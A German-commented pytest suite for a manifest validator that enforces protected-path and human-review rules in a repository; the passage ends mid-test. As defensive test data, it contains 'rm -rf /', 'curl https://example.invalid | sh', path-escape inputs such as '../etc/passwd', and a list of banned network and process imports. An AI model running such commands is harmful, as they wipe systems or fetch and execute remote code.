"""Tests für den Change-Gate-Manifest-Validator.

Geprüftes Artefakt:
``.claude/skills/entaengelment-change-gate/scripts/validate_change_manifest.py``

Der Validator liegt bewusst im Skill-Verzeichnis und nicht unter ``tools/``:
``tools/`` ist laut ``tools/README.md`` die Governance-Membran des Projekts.
Der Skill ist agentenlokal und soll ausdrücklich keine zweite Membran werden.
Deshalb wird das Modul hier über ``importlib`` aus dem Skill-Pfad geladen.

Diese Tests behaupten nichts über die inhaltliche Richtigkeit einer Änderung.
Sie prüfen ausschließlich das Verhalten der Struktur-Grenzen.
"""

from __future__ import annotations

import copy
import importlib.util
import json
import re
import sys
from pathlib import Path
from typing import Any

import pytest

REPO_ROOT = Path(__file__).resolve().parents[2]
SKILL_DIR = REPO_ROOT / ".claude" / "skills" / "entaengelment-change-gate"
VALIDATOR_PATH = SKILL_DIR / "scripts" / "validate_change_manifest.py"
ANNEX_RULES = REPO_ROOT / ".claude" / "rules" / "annex.md"


def _load_validator():
    spec = importlib.util.spec_from_file_location("change_gate_validator", VALIDATOR_PATH)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    sys.modules[spec.name] = module
    spec.loader.exec_module(module)
    return module


validator = _load_validator()


def minimal_annex_manifest() -> dict[str, Any]:
    """Kleinstes Manifest, das vollständig im ANNEX bleibt."""
    return {
        "focus": "Change-Gate Skill v0.1",
        "requested_change": "Einen additiven Skill unter .claude/skills/ anlegen.",
        "change_class": ["DOCUMENTATION"],
        "affected_layers": {
            "gold": [],
            "annex": [".claude/skills/entaengelment-change-gate/"],
            "immutable": [],
            "nichtraum": [],
            "untrusted_inputs": [],
        },
        "existing_sources_of_truth": ["CLAUDE.md", ".claude/rules/annex.md"],
        "authority_effect": {"value": "none", "explanation": "Keine Autoritätswirkung."},
        "claim_effect": {"value": "none", "explanation": "Kein Claim wird umgetaggt."},
        "human_decision": {"required": False, "questions": []},
        "possible_parallel_system": {
            "systems_checked": [],
            "detected_overlaps": [],
            "mitigation": "",
        },
        "known_loss": [],
        "falsifiers": ["Ein Manifest mit GOLD-Wirkung erhält trotzdem ein positives Verdikt."],
        "reversibility": {
            "value": "REVERSIBLE",
            "rollback_path": "Verzeichnis nach NICHTRAUM/archive/ verschieben.",
        },
        "allowed_paths": [".claude/skills/entaengelment-change-gate/"],
        "forbidden_paths": ["index/", "policies/", "VOIDMAP.yml", "data/receipts/"],
        "verification_commands": ["make verify"],
        "expected_gate_outcome": "ELIGIBLE_FOR_EXTERNAL_REVIEW",
        "unresolved_points": [],
    }


def codes(result) -> set:
    return {finding.code for finding in result.findings}


def reason_code_names() -> list[str]:
    """Reason-Code-Konstanten aus dem Validator-Quelltext lesen (NAME = "NAME")."""
    source = VALIDATOR_PATH.read_text(encoding="utf-8")
    names = re.findall(r'^([A-Z][A-Z0-9_]+) = "\1"$', source, re.MULTILINE)
    return sorted(name for name in names if not name.startswith("VERDICT_"))


# ---------------------------------------------------------------------------
# 1. Valides minimales ANNEX-Manifest
# ---------------------------------------------------------------------------


class TestMinimalAnnexManifest:
    def test_minimal_manifest_has_no_findings(self):
        result = validator.validate_manifest(minimal_annex_manifest(), REPO_ROOT)
        assert result.findings == ()
        assert result.verdict == validator.VERDICT_ELIGIBLE

    def test_self_declared_hold_is_never_upgraded(self):
        data = minimal_annex_manifest()
        data["expected_gate_outcome"] = "HOLD"
        result = validator.validate_manifest(data, REPO_ROOT)
        assert result.findings == ()
        assert result.verdict == validator.VERDICT_HOLD


# ---------------------------------------------------------------------------
# 2. Fehlendes Pflichtfeld
# ---------------------------------------------------------------------------


class TestMissingRequiredField:
    @pytest.mark.parametrize(
        "field",
        ["focus", "falsifiers", "affected_layers", "existing_sources_of_truth"],
    )
    def test_missing_field_is_reported(self, field):
        data = minimal_annex_manifest()
        del data[field]
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.MISSING_REQUIRED_FIELD in codes(result)
        assert result.verdict == validator.VERDICT_HOLD

    def test_empty_required_list_is_reported(self):
        data = minimal_annex_manifest()
        data["falsifiers"] = []
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.EMPTY_REQUIRED_VALUE in codes(result)

    def test_missing_layer_key_is_reported(self):
        data = minimal_annex_manifest()
        del data["affected_layers"]["nichtraum"]
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.MISSING_REQUIRED_FIELD in codes(result)

    @pytest.mark.parametrize("key", ["systems_checked", "detected_overlaps"])
    def test_missing_parallel_system_key_is_reported(self, key):
        data = minimal_annex_manifest()
        del data["possible_parallel_system"][key]
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.MISSING_REQUIRED_FIELD in codes(result)


# ---------------------------------------------------------------------------
# 2b. Fokus-Vertrag: 2-5 Wörter (ausführbar, whitespace-basiert)
# ---------------------------------------------------------------------------


class TestFocusWordCount:
    @pytest.mark.parametrize(
        ("focus", "expect_finding"),
        [
            ("Changegate", True),  # 1 Wort
            ("Change-Gate Skill", False),  # 2 Wörter
            ("Change Gate Skill v0.1 schaerfen", False),  # 5 Wörter
            ("Change Gate Skill v0.1 nach Review", True),  # 6 Wörter
        ],
    )
    def test_word_count_boundaries(self, focus, expect_finding):
        data = minimal_annex_manifest()
        data["focus"] = focus
        result = validator.validate_manifest(data, REPO_ROOT)
        assert (validator.FOCUS_WORD_COUNT_INVALID in codes(result)) is expect_finding
        if expect_finding:
            assert result.verdict == validator.VERDICT_HOLD

    def test_extra_whitespace_does_not_change_the_result(self):
        compact = minimal_annex_manifest()
        compact["focus"] = "Change-Gate Skill"
        padded = minimal_annex_manifest()
        padded["focus"] = "  Change-Gate\t\tSkill \n "
        assert validator.count_focus_words(padded["focus"]) == 2
        assert validator.validate_manifest(compact, REPO_ROOT) == validator.validate_manifest(
            padded, REPO_ROOT
        )

    def test_empty_focus_reports_only_the_empty_value(self):
        """Ein leerer Fokus ist ein leerer Pflichtwert, keine Wortzahlverletzung."""
        data = minimal_annex_manifest()
        data["focus"] = "   "
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.EMPTY_REQUIRED_VALUE in codes(result)
        assert validator.FOCUS_WORD_COUNT_INVALID not in codes(result)

    def test_count_is_whitespace_based_and_documented(self):
        assert validator.count_focus_words("eins") == 1
        assert validator.count_focus_words("eins zwei") == 2
        assert validator.count_focus_words("a b c d e") == 5
        assert validator.count_focus_words("") == 0
        assert validator.FOCUS_MIN_WORDS == 2
        assert validator.FOCUS_MAX_WORDS == 5


# ---------------------------------------------------------------------------
# 3. Unbekannter Enum-Wert / unbekanntes Feld
# ---------------------------------------------------------------------------


class TestUnknownValues:
    def test_unknown_change_class_is_reported(self):
        data = minimal_annex_manifest()
        data["change_class"] = ["REFACTORING"]
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.UNKNOWN_ENUM_VALUE in codes(result)

    def test_unknown_authority_effect_value_is_reported(self):
        data = minimal_annex_manifest()
        data["authority_effect"]["value"] = "granted"
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.UNKNOWN_ENUM_VALUE in codes(result)

    def test_unknown_top_level_field_is_reported(self):
        data = minimal_annex_manifest()
        data["auto_merge"] = True
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.UNKNOWN_FIELD in codes(result)

    def test_unknown_nested_field_is_reported(self):
        data = minimal_annex_manifest()
        data["human_decision"]["skip"] = True
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.UNKNOWN_FIELD in codes(result)


# ---------------------------------------------------------------------------
# 4. GOLD-Änderung ohne HumanDecision
# ---------------------------------------------------------------------------


class TestGoldBoundary:
    def test_gold_path_without_human_decision(self):
        data = minimal_annex_manifest()
        data["affected_layers"]["gold"] = ["policies/claim_tags_v0_2.yaml"]
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.GOLD_PATH_REQUIRES_HUMAN_DECISION in codes(result)
        assert result.verdict == validator.VERDICT_HOLD

    def test_gold_path_with_concrete_question_clears_that_finding(self):
        data = minimal_annex_manifest()
        data["affected_layers"]["gold"] = ["policies/claim_tags_v0_2.yaml"]
        data["human_decision"] = {
            "required": True,
            "questions": ["Soll policies/claim_tags_v0_2.yaml wirklich geändert werden?"],
        }
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.GOLD_PATH_REQUIRES_HUMAN_DECISION not in codes(result)

    def test_undeclared_gold_path_in_allowlist_is_reported(self):
        data = minimal_annex_manifest()
        data["allowed_paths"] = ["index/COMPACT_INDEX_v3.yaml"]
        data["forbidden_paths"] = []
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.GOLD_PATH_UNDECLARED in codes(result)

    def test_immutable_path_requires_human_decision(self):
        data = minimal_annex_manifest()
        data["affected_layers"]["immutable"] = ["data/receipts/example.json"]
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.IMMUTABLE_PATH_REQUIRES_HUMAN_DECISION in codes(result)

    def test_nichtraum_path_requires_human_decision(self):
        data = minimal_annex_manifest()
        data["affected_layers"]["nichtraum"] = ["NICHTRAUM/maybe/offen.md"]
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.NICHTRAUM_PATH_REQUIRES_HUMAN_DECISION in codes(result)


# ---------------------------------------------------------------------------
# 4b. Undeklarierte geschützte Pfade in allowed_paths (adversarial)
#
# Ein geschützter Pfad darf nicht über allowed_paths freigegeben werden, ohne
# in der zugehörigen affected_layers-Liste zu stehen. Sonst entfiele die
# HumanDecision-Pflicht still.
# ---------------------------------------------------------------------------


def _concrete_question(target: str) -> dict[str, Any]:
    return {"required": True, "questions": [f"Soll {target} wirklich berührt werden?"]}


class TestUndeclaredProtectedPaths:
    @pytest.mark.parametrize(
        "path",
        ["data/receipts/2026-01-15_receipt.json", "receipts/arc_sample.json"],
    )
    def test_undeclared_immutable_path_is_reported(self, path):
        data = minimal_annex_manifest()
        data["allowed_paths"] = [path]
        data["forbidden_paths"] = []
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.IMMUTABLE_PATH_UNDECLARED in codes(result)
        assert result.verdict == validator.VERDICT_HOLD

    def test_undeclared_nichtraum_path_is_reported(self):
        data = minimal_annex_manifest()
        data["allowed_paths"] = ["NICHTRAUM/maybe/unentschieden.md"]
        data["forbidden_paths"] = []
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.NICHTRAUM_PATH_UNDECLARED in codes(result)
        assert result.verdict == validator.VERDICT_HOLD

    def test_declared_immutable_path_still_needs_human_decision(self):
        """Nach korrekter Deklaration bleibt die HumanDecision-Pflicht."""
        data = minimal_annex_manifest()
        path = "data/receipts/2026-01-15_receipt.json"
        data["affected_layers"]["immutable"] = [path]
        data["allowed_paths"] = [path]
        data["forbidden_paths"] = []
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.IMMUTABLE_PATH_UNDECLARED not in codes(result)
        assert validator.IMMUTABLE_PATH_REQUIRES_HUMAN_DECISION in codes(result)
        assert result.verdict == validator.VERDICT_HOLD

    def test_declared_nichtraum_path_still_needs_human_decision(self):
        data = minimal_annex_manifest()
        path = "NICHTRAUM/maybe/unentschieden.md"
        data["affected_layers"]["nichtraum"] = [path]
        data["allowed_paths"] = [path]
        data["forbidden_paths"] = []
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.NICHTRAUM_PATH_UNDECLARED not in codes(result)
        assert validator.NICHTRAUM_PATH_REQUIRES_HUMAN_DECISION in codes(result)
        assert result.verdict == validator.VERDICT_HOLD

    def test_declared_immutable_path_with_question_clears_both_findings(self):
        data = minimal_annex_manifest()
        path = "data/receipts/2026-01-15_receipt.json"
        data["affected_layers"]["immutable"] = [path]
        data["allowed_paths"] = [path]
        data["forbidden_paths"] = []
        data["human_decision"] = _concrete_question(path)
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.IMMUTABLE_PATH_UNDECLARED not in codes(result)
        assert validator.IMMUTABLE_PATH_REQUIRES_HUMAN_DECISION not in codes(result)

    def test_every_protected_layer_has_an_undeclared_code(self):
        """Kein geschützter Layer ohne Undeclared-Prüfung (Drift-Schutz)."""
        keys = {entry[0] for entry in validator.PROTECTED_LAYERS}
        assert keys == {"gold", "immutable", "nichtraum"}
        for _key, _label, human_code, undeclared_code, prefixes in validator.PROTECTED_LAYERS:
            assert human_code.endswith("_REQUIRES_HUMAN_DECISION")
            assert undeclared_code.endswith("_UNDECLARED")
            assert prefixes


# ---------------------------------------------------------------------------
# 5. HumanDecision ohne konkrete Frage
# ---------------------------------------------------------------------------


class TestHumanDecisionQuestions:
    def test_required_without_questions(self):
        data = minimal_annex_manifest()
        data["human_decision"] = {"required": True, "questions": []}
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.HUMAN_DECISION_WITHOUT_QUESTION in codes(result)

    def test_required_with_statement_instead_of_question(self):
        data = minimal_annex_manifest()
        data["human_decision"] = {
            "required": True,
            "questions": ["Bitte einmal drüberschauen."],
        }
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.HUMAN_DECISION_WITHOUT_QUESTION in codes(result)

    def test_promotion_without_human_decision(self):
        data = minimal_annex_manifest()
        data["claim_effect"] = {"value": "requested", "explanation": "Tag-Promotion beantragt."}
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.PROMOTION_WITHOUT_HUMAN_DECISION in codes(result)


# ---------------------------------------------------------------------------
# 6. Endgültige Selbstattestierung
# ---------------------------------------------------------------------------


class TestSelfAttestation:
    @pytest.mark.parametrize("token", ["VALIDATED", "PROVEN", "SAFE", "CANON", "TRUE"])
    def test_final_self_attestation_is_reported(self, token):
        data = minimal_annex_manifest()
        data["authority_effect"]["explanation"] = f"Die Änderung ist {token}."
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.FORBIDDEN_SELF_ATTESTATION in codes(result)
        assert result.verdict == validator.VERDICT_HOLD

    def test_bracketed_claim_tag_reference_is_allowed(self):
        data = minimal_annex_manifest()
        data["claim_effect"][
            "explanation"
        ] = "Verweis auf den Tag [CANON] aus policies/claim_tags_v0_2.yaml."
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.FORBIDDEN_SELF_ATTESTATION not in codes(result)

    def test_gold_word_alone_is_not_self_attestation(self):
        """Bekannter Verlust: 'GOLD' ist Schichtname, keine Attestierung."""
        data = minimal_annex_manifest()
        data["requested_change"] = "Ein GOLD-Pfad wird ausdrücklich nicht berührt."
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.FORBIDDEN_SELF_ATTESTATION not in codes(result)


# ---------------------------------------------------------------------------
# 7. Endgültiger PASS
# ---------------------------------------------------------------------------


class TestFinalPass:
    def test_pass_as_expected_outcome_is_rejected(self):
        data = minimal_annex_manifest()
        data["expected_gate_outcome"] = "PASS"
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.FINAL_PASS_NOT_PERMITTED in codes(result)
        assert validator.UNKNOWN_ENUM_VALUE in codes(result)
        assert result.verdict == validator.VERDICT_HOLD

    def test_pass_anywhere_in_manifest_is_rejected(self):
        data = minimal_annex_manifest()
        data["unresolved_points"] = ["Nach dem Lauf gilt der Change als PASS."]
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.FINAL_PASS_NOT_PERMITTED in codes(result)

    def test_eligible_outcome_is_not_a_final_pass(self):
        data = minimal_annex_manifest()
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.FINAL_PASS_NOT_PERMITTED not in codes(result)


# ---------------------------------------------------------------------------
# 8. Mögliches paralleles Statussystem
# ---------------------------------------------------------------------------


class TestParallelSystem:
    def test_governance_adjacent_without_checked_systems(self):
        data = minimal_annex_manifest()
        data["change_class"] = ["GOVERNANCE_ADJACENT"]
        data["known_loss"] = ["Der Skill kennt keine Receipts."]
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.POSSIBLE_PARALLEL_SYSTEM in codes(result)
        assert result.verdict == validator.VERDICT_HOLD

    def test_checked_systems_without_overlap_is_allowed(self):
        """Geprüft, nichts gefunden: zulässig — leeres detected_overlaps ist kein Defizit."""
        data = minimal_annex_manifest()
        data["change_class"] = ["GOVERNANCE_ADJACENT"]
        data["known_loss"] = ["Der Skill kennt keine Receipts."]
        data["authority_effect"] = {
            "value": "none",
            "explanation": "Nicht verdrahtet, kein Enforcement.",
        }
        data["possible_parallel_system"] = {
            "systems_checked": ["policies/claim_tags_v0_2.yaml", "src/core/evidence_routing.py"],
            "detected_overlaps": [],
            "mitigation": "",
        }
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.POSSIBLE_PARALLEL_SYSTEM not in codes(result)
        assert result.findings == ()

    def test_detected_overlap_without_mitigation(self):
        data = minimal_annex_manifest()
        data["possible_parallel_system"] = {
            "systems_checked": ["policies/claim_tags_v0_2.yaml"],
            "detected_overlaps": ["policies/claim_tags_v0_2.yaml"],
            "mitigation": "",
        }
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.POSSIBLE_PARALLEL_SYSTEM in codes(result)
        assert result.verdict == validator.VERDICT_HOLD

    def test_detected_overlap_with_mitigation_is_allowed(self):
        data = minimal_annex_manifest()
        data["possible_parallel_system"] = {
            "systems_checked": ["policies/claim_tags_v0_2.yaml"],
            "detected_overlaps": ["policies/claim_tags_v0_2.yaml"],
            "mitigation": "Register wird nur gelesen, kein Tag wird erzeugt.",
        }
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.POSSIBLE_PARALLEL_SYSTEM not in codes(result)
        assert result.findings == ()

    def test_legacy_detected_overlaps_form_does_not_pass_silently(self):
        """Die alte Bool-Semantik ist ein unbekanntes Feld, kein stiller Durchlauf."""
        data = minimal_annex_manifest()
        data["possible_parallel_system"] = {
            "detected": False,
            "overlaps": [],
            "mitigation": "",
        }
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.UNKNOWN_FIELD in codes(result)
        assert validator.MISSING_REQUIRED_FIELD in codes(result)
        assert result.verdict == validator.VERDICT_HOLD

    def test_legacy_contradiction_detected_true_without_overlaps_is_rejected(self):
        data = minimal_annex_manifest()
        data["possible_parallel_system"] = {
            "detected": True,
            "overlaps": [],
            "mitigation": "",
        }
        result = validator.validate_manifest(data, REPO_ROOT)
        assert result.verdict == validator.VERDICT_HOLD
        assert validator.UNKNOWN_FIELD in codes(result)

    def test_governance_adjacent_needs_a_justified_authority_effect(self):
        data = minimal_annex_manifest()
        data["change_class"] = ["GOVERNANCE_ADJACENT"]
        data["authority_effect"] = {"value": "none", "explanation": ""}
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.AUTHORITY_EFFECT_UNDERSTATED in codes(result)
        assert validator.MISSING_KNOWN_LOSS in codes(result)

    def test_justified_none_is_not_forced_to_escalate(self):
        """'none' darf begründet bleiben; der Gate erzwingt keine Hochstufung."""
        data = minimal_annex_manifest()
        data["change_class"] = ["GOVERNANCE_ADJACENT"]
        data["authority_effect"] = {
            "value": "none",
            "explanation": "Nicht in make verify oder CI verdrahtet, kein Enforcement.",
        }
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.AUTHORITY_EFFECT_UNDERSTATED not in codes(result)

    def test_gold_touch_always_understates_none(self):
        data = minimal_annex_manifest()
        data["affected_layers"]["gold"] = ["VOIDMAP.yml"]
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.AUTHORITY_EFFECT_UNDERSTATED in codes(result)

    def test_claim_surface_understates_claim_effect(self):
        data = minimal_annex_manifest()
        data["affected_layers"]["gold"] = ["spec/cglg.spec.json"]
        data["allowed_paths"] = ["spec/cglg.spec.json"]
        data["forbidden_paths"] = []
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.CLAIM_EFFECT_UNDERSTATED in codes(result)


# ---------------------------------------------------------------------------
# 9. Widersprüchliche Pfadfreigaben
# ---------------------------------------------------------------------------


class TestPathConflicts:
    def test_identical_path_allowed_and_forbidden(self):
        data = minimal_annex_manifest()
        data["allowed_paths"] = ["docs/example.md"]
        data["forbidden_paths"] = ["docs/example.md"]
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.PATH_ALLOWLIST_CONFLICT in codes(result)

    def test_allowed_path_under_forbidden_directory(self):
        data = minimal_annex_manifest()
        data["allowed_paths"] = ["docs/guards/example.md"]
        data["forbidden_paths"] = ["docs/guards/"]
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.PATH_ALLOWLIST_CONFLICT in codes(result)

    def test_dot_directory_prefix_is_not_stripped(self):
        """Regression: '.claude/...' darf nicht zu 'claude/...' normalisiert werden."""
        assert validator._normalize_path("./.claude/skills/") == ".claude/skills"
        assert validator._matches_prefix(".claude/skills/x.md", [".claude/skills"])
        assert not validator._matches_prefix(".claude/skills/x.md", ["claude/skills"])


# ---------------------------------------------------------------------------
# 10. Determinismus
# ---------------------------------------------------------------------------


class TestDeterminism:
    def test_identical_input_yields_identical_output(self):
        data = minimal_annex_manifest()
        data["change_class"] = ["GOVERNANCE_ADJACENT", "CODE"]
        data["affected_layers"]["gold"] = ["VOIDMAP.yml"]
        data["allowed_paths"] = ["VOIDMAP.yml", "docs/x.md"]
        data["forbidden_paths"] = ["docs/"]

        first = validator.validate_manifest(copy.deepcopy(data), REPO_ROOT)
        second = validator.validate_manifest(copy.deepcopy(data), REPO_ROOT)

        assert first == second
        assert json.dumps(first.as_dict(), sort_keys=True) == json.dumps(
            second.as_dict(), sort_keys=True
        )

    def test_findings_are_sorted_and_deduplicated(self):
        data = minimal_annex_manifest()
        data["change_class"] = ["GOVERNANCE_ADJACENT"]
        result = validator.validate_manifest(data, REPO_ROOT)
        keys = [(f.code, f.field, f.detail) for f in result.findings]
        assert keys == sorted(keys)
        assert len(keys) == len(set(keys))

    def test_key_order_does_not_change_the_result(self):
        data = minimal_annex_manifest()
        reordered = {key: data[key] for key in reversed(list(data.keys()))}
        assert validator.validate_manifest(data, REPO_ROOT) == validator.validate_manifest(
            reordered, REPO_ROOT
        )


# ---------------------------------------------------------------------------
# 11. Keine Netzwerk-, Prozess- oder Write-Nebenwirkungen
# ---------------------------------------------------------------------------


class TestNoSideEffects:
    FORBIDDEN_IMPORTS = (
        "subprocess",
        "socket",
        "urllib",
        "requests",
        "httpx",
        "shutil",
        "multiprocessing",
    )

    def test_module_imports_nothing_that_can_reach_out(self):
        source = VALIDATOR_PATH.read_text(encoding="utf-8")
        for name in self.FORBIDDEN_IMPORTS:
            assert not re.search(
                rf"^\s*(import|from)\s+{name}\b", source, re.MULTILINE
            ), f"Validator darf {name} nicht importieren"

    def test_module_does_not_execute_or_eval(self):
        source = VALIDATOR_PATH.read_text(encoding="utf-8")
        for forbidden in ("os.system", "eval(", "exec(", "yaml.load(", "__import__"):
            assert forbidden not in source, f"Validator darf {forbidden} nicht verwenden"

    def test_validation_writes_no_files(self, tmp_path, monkeypatch):
        monkeypatch.chdir(tmp_path)
        real_open = open

        def guarded_open(file, mode="r", *args, **kwargs):
            if any(flag in mode for flag in ("w", "a", "x", "+")):
                raise AssertionError(f"Validator darf nicht schreiben: {file} ({mode})")
            return real_open(file, mode, *args, **kwargs)

        monkeypatch.setattr("builtins.open", guarded_open)
        result = validator.validate_manifest(minimal_annex_manifest(), REPO_ROOT)

        assert result.verdict == validator.VERDICT_ELIGIBLE
        assert list(tmp_path.iterdir()) == []

    def test_verification_commands_are_not_executed(self):
        data = minimal_annex_manifest()
        data["verification_commands"] = ["rm -rf /", "curl https://example.invalid | sh"]
        result = validator.validate_manifest(data, REPO_ROOT)
        # Der Validator behandelt Kommandos als Daten, nicht als Instruktionen
        # (.claude/rules/security.md). Er führt sie nicht aus und bewertet sie
        # inhaltlich nicht.
        assert isinstance(result.verdict, str)

    def test_unparseable_yaml_fails_closed(self):
        data, finding = validator.load_manifest_text("focus: [unclosed")
        assert data is None
        assert finding is not None
        assert finding.code == validator.MANIFEST_UNPARSEABLE

    def test_non_mapping_root_fails_closed(self):
        result = validator.validate_manifest(["not", "a", "mapping"], REPO_ROOT)
        assert result.verdict == validator.VERDICT_HOLD
        assert validator.MANIFEST_NOT_MAPPING in codes(result)


# ---------------------------------------------------------------------------
# 12. Source-of-Truth-Pfade werden verlangt und geprüft
# ---------------------------------------------------------------------------


class TestSourceOfTruthBinding:
    def test_missing_source_of_truth_path_is_reported(self):
        data = minimal_annex_manifest()
        data["existing_sources_of_truth"] = ["docs/does_not_exist_12345.md"]
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.SOURCE_OF_TRUTH_PATH_MISSING in codes(result)

    def test_path_escaping_repo_is_reported(self):
        data = minimal_annex_manifest()
        data["existing_sources_of_truth"] = ["../etc/passwd", "/etc/hosts"]
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.SOURCE_OF_TRUTH_PATH_ESCAPES_REPO in codes(result)

    def test_path_check_is_skipped_without_repo_root(self):
        data = minimal_annex_manifest()
        data["existing_sources_of_truth"] = ["docs/does_not_exist_12345.md"]
        result = validator.validate_manifest(data, None)
        assert validator.SOURCE_OF_TRUTH_PATH_MISSING not in codes(result)

    def test_declared_sources_of_truth_exist_in_repo(self):
        """Die im Template genannten Quellen müssen real existieren."""
        for path in ("CLAUDE.md", ".claude/rules/annex.md", "policies/claim_tags_v0_2.yaml"):
            assert (REPO_ROOT / path).exists(), path

    def test_gold_and_immutable_prefixes_are_backed_by_annex_rules(self):
        """Die Pfadklassen sind Kopien, keine zweiten Definitionen.

        Der Test macht Drift sichtbar: Jedes im Validator konfigurierte Präfix
        muss in seiner Quelldatei wörtlich vorkommen.
        """
        rules = ANNEX_RULES.read_text(encoding="utf-8")
        for prefix in validator.GOLD_PREFIXES + validator.IMMUTABLE_PREFIXES:
            assert prefix in rules, f"{prefix} ist in .claude/rules/annex.md nicht belegt"

    def test_nichtraum_prefix_is_backed_by_house_rules(self):
        """NICHTRAUM wird von CLAUDE.md (G2) geführt, nicht von annex.md."""
        house_rules = (REPO_ROOT / "CLAUDE.md").read_text(encoding="utf-8")
        for prefix in validator.NICHTRAUM_PREFIXES:
            assert prefix in house_rules, f"{prefix} ist in CLAUDE.md nicht belegt"

    def test_irreversible_change_needs_rollback_and_question(self):
        data = minimal_annex_manifest()
        data["reversibility"] = {"value": "IRREVERSIBLE", "rollback_path": ""}
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.IRREVERSIBLE_WITHOUT_ROLLBACK in codes(result)
        assert validator.IRREVERSIBLE_WITHOUT_HUMAN_DECISION in codes(result)
        assert result.verdict == validator.VERDICT_HOLD

    def test_irreversible_with_rollback_still_needs_human_decision(self):
        data = minimal_annex_manifest()
        data["reversibility"] = {
            "value": "IRREVERSIBLE",
            "rollback_path": "Snapshot aus OUT/ zurückspielen.",
        }
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.IRREVERSIBLE_WITHOUT_ROLLBACK not in codes(result)
        assert validator.IRREVERSIBLE_WITHOUT_HUMAN_DECISION in codes(result)
        assert result.verdict == validator.VERDICT_HOLD

    def test_reversible_without_rollback_path_is_reported(self):
        """Auch REVERSIBLE braucht einen konkret benannten Rücknahmepfad (G3)."""
        data = minimal_annex_manifest()
        data["reversibility"] = {"value": "REVERSIBLE", "rollback_path": "   "}
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.REVERSIBLE_WITHOUT_ROLLBACK in codes(result)
        assert validator.IRREVERSIBLE_WITHOUT_ROLLBACK not in codes(result)
        assert validator.IRREVERSIBLE_WITHOUT_HUMAN_DECISION not in codes(result)
        assert result.verdict == validator.VERDICT_HOLD

    def test_reversible_with_rollback_path_is_allowed(self):
        data = minimal_annex_manifest()
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.REVERSIBLE_WITHOUT_ROLLBACK not in codes(result)
        assert result.findings == ()

    def test_validator_does_not_claim_the_rollback_path_works(self):
        """Geprüft wird nur, DASS ein Pfad deklariert ist — nicht ob er funktioniert."""
        data = minimal_annex_manifest()
        data["reversibility"] = {"value": "REVERSIBLE", "rollback_path": "irgendwas"}
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.REVERSIBLE_WITHOUT_ROLLBACK not in codes(result)

    def test_untrusted_input_needs_declared_loss(self):
        data = minimal_annex_manifest()
        data["affected_layers"]["untrusted_inputs"] = ["INBOX/fremd.md"]
        result = validator.validate_manifest(data, REPO_ROOT)
        assert validator.UNTRUSTED_INPUT_WITHOUT_DECLARED_LOSS in codes(result)


# ---------------------------------------------------------------------------
# Template und CLI
# ---------------------------------------------------------------------------


class TestTemplateAndCli:
    def test_template_matches_the_closed_schema(self):
        yaml = pytest.importorskip("yaml")
        template = yaml.safe_load(
            (SKILL_DIR / "templates" / "change-manifest.yaml").read_text(encoding="utf-8")
        )
        assert set(template.keys()) == set(validator.TOP_LEVEL_FIELDS)
        assert set(template["affected_layers"].keys()) == set(validator.AFFECTED_LAYER_KEYS)
        assert set(template["possible_parallel_system"].keys()) == set(
            validator.PARALLEL_SYSTEM_KEYS
        )

    def test_template_is_incomplete_and_therefore_holds(self):
        """Das leere Template ist absichtlich noch kein gültiges Manifest."""
        yaml = pytest.importorskip("yaml")
        template = yaml.safe_load(
            (SKILL_DIR / "templates" / "change-manifest.yaml").read_text(encoding="utf-8")
        )
        result = validator.validate_manifest(template, REPO_ROOT)
        assert result.verdict == validator.VERDICT_HOLD

    def _write(self, tmp_path, data):
        yaml = pytest.importorskip("yaml")
        manifest = tmp_path / "manifest.yaml"
        manifest.write_text(yaml.safe_dump(data, allow_unicode=True), encoding="utf-8")
        return manifest

    def test_cli_returns_zero_on_eligible(self, tmp_path):
        manifest = self._write(tmp_path, minimal_annex_manifest())
        assert validator.main([str(manifest), "--repo-root", str(REPO_ROOT)]) == 0

    def test_cli_returns_one_on_self_declared_hold_without_findings(self, tmp_path):
        data = minimal_annex_manifest()
        data["expected_gate_outcome"] = "HOLD"
        manifest = self._write(tmp_path, data)
